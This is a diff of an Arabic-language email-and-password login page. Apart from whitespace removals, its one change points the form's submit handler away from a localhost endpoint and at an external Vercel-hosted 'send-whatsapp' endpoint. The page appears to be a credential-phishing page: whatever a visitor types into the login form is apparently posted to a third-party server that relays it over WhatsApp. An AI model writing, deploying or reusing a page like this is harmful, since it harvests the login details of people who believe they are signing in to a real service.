@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="ar">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -20,7 +19,6 @@
             margin: 0;
             color: #fff;
         }
-
         .background-blur {
             position: fixed;
             top: 0;
@@ -33,7 +31,6 @@
             filter: blur(8px);
             z-index: -1;
         }
-
         .login-container {
             background-color: rgba(0, 0, 0, 0.8);
             padding: 40px;
@@ -42,13 +39,11 @@
             width: 350px;
             text-align: center;
         }
-
         h2 {
             margin-bottom: 25px;
             font-size: 28px;
             color: #ffd700;
         }
-
         input[type="email"],
         input[type="password"] {
             width: 100%;
@@ -58,7 +53,6 @@
             border-radius: 6px;
             font-size: 16px;
         }
-
         input[type="submit"] {
             background-color: #28a745;
             color: white;
@@ -69,11 +63,9 @@
             width: 100%;
             font-size: 18px;
         }
-
         .forgot-password {
             margin-top: 15px;
         }
-
         .footer {
             margin-top: 20px;
             font-size: 14px;
@@ -93,7 +85,7 @@
             };
 
             try {
-                const response = await fetch('http://localhost:3000/send-whatsapp', {
+                const response = await fetch('https://bompastic-qg8r86r87-importants-projects-9680af2c.vercel.app/send-whatsapp', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -114,11 +106,8 @@
         }
     </script>
 </head>
-
 <body>
-
     <div class="background-blur"></div>
-
     <div class="login-container">
         <h2>تسجيل الدخول</h2>
         <form onsubmit="redirectToUrl(event)">
@@ -133,7 +122,5 @@
             &copy; 2024 جميع الحقوق محفوظة
         </div>
     </div>
-
 </body>
-
 </html>
